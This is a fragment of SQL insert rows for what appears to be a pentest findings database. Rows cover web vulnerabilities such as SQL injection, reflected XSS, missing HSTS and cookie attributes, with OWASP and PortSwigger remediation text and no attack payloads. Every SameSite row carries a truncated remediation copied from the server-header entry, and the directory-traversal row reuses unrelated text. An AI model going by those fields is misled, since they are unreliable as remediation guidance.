(436, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 104, 'Low'),
(437, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 105, 'High'),
(438, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 105, 'High'),
(439, 'Missing HttpOnly Attribute in Cookie Header', 'The HttpOnly attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.', 'Implement HttpOnly Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 105, 'Low'),
(440, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 105, 'Low'),
(441, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 106, 'Low'),
(442, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 106, 'Low'),
(443, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 106, 'Low'),
(444, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 106, 'Low'),
(445, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 104, 'Medium'),
(446, 'Directory Traversal File Include', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-ATHZ-01', 104, 'Medium'),
(447, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 109, 'Low'),
(448, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 109, 'Low'),
(449, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 109, 'Low'),
(450, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 109, 'Low'),
(451, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 110, 'Low'),
(452, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 110, 'Low'),
(453, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 110, 'Low'),
(454, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 110, 'Low'),
(455, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 111, 'Medium'),
(456, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 111, 'Low'),
(457, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 111, 'Low'),
(458, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 111, 'Low'),
(459, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 111, 'Low'),
(460, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 112, 'Low'),
(461, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 112, 'Low'),
(462, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 112, 'Low'),
(463, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 112, 'Low'),
(464, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 113, 'High'),
(465, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 113, 'High'),
(466, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 113, 'Low'),
(467, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 113, 'Low'),
(468, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 113, 'Low'),
(469, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 113, 'Low'),
(470, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 114, 'Low'),
(471, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 114, 'Low'),
(472, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 114, 'Low'),
(473, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 114, 'Low'),
(474, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 115, 'Low'),
(475, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 115, 'Low'),
(476, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 115, 'Low'),
(477, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 115, 'Low'),
